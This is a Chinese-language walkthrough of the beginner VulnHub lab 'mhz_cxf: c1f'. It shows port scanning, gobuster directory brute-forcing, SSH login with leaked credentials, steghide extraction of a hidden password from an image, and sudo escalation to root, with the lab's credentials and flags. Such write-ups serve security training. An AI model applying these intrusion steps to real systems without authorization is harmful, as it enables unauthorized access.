# mhz_cxf: c1f

2024-6-13 https://www.vulnhub.com/entry/mhz_cxf-c1f,471/

difficulty: Beginner

## IP

192.168.5.40

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 38d93f98159acc3e7a448df94d78fe2c (RSA)
|   256 894e387778a4c36ddc39c400f8a567ed (ECDSA)
|_  256 7c15b918fc5c75aa3096154608a983fb (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

80 首页没什么信息，源码也没有提示。使用 gobuster 进行扫描:

```
gobuster -t 32 dir -u http://192.168.5.40/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html,rar,zip,sql,bak -e

http://192.168.5.40/notes.txt
```

看看 /notex.txt 有什么信息，提示 2 个文件: remb.txt and remb2.txt

remb.txt 中发现用户名：

```
first_stage:flagitifyoucan1234
```

尝试使用 ssh 进行登陆，可以登陆。

发现 user flag：

```
first_stage@mhz_c1f:~$ cat user.txt
HEEEEEY , you did it
that's amazing , good job man

so just keep it up and get the root bcz i hate low privileges ;)

#mhz_cyber
```

进入到另外一个用户目录/home/mhz_c1f 发现有一个 Paintings 文件夹，里面有 4 张图片，将其拷贝到 kali 上，根据靶场描述，有图片隐写，进行相关查看。

exiftool 查看没有发现注释等信息。

steghide 发现有捆绑：

```
steghide info 'spinning the wool.jpeg'

Enter passphrase:
  embedded file "remb2.txt":
    size: 85.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes

steghide extract -sf 'spinning the wool.jpeg'

不用输入密码，直接提取
```

```
cat remb2.txt
ooh , i know should delete this , but i cant' remember it
screw me

mhz_c1f:1@ec1f
```

获得 mhz_c1f 的密码 1@ec1f，su 切换到该用户。

sudo -l 发现是 ALL，可以直接提权了:

```
sudo su

root@mhz_c1f:~# id
uid=0(root) gid=0(root) groups=0(root)
root@mhz_c1f:~# ls -al
total 32
drwx------  3 root root 4096 Apr 24  2020 .
drwxr-xr-x 24 root root 4096 Apr 13  2020 ..
-rw-------  1 root root   54 Apr 24  2020 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  124 Apr 24  2020 .root.txt
drwx------  2 root root 4096 Apr 13  2020 .ssh
-rw-------  1 root root  833 Apr 24  2020 .viminfo
root@mhz_c1f:~# cat .root.txt
OwO HACKER MAN :D

Well done sir , you have successfully got the root flag.
I hope you enjoyed in this mission.

#mhz_cyber
```
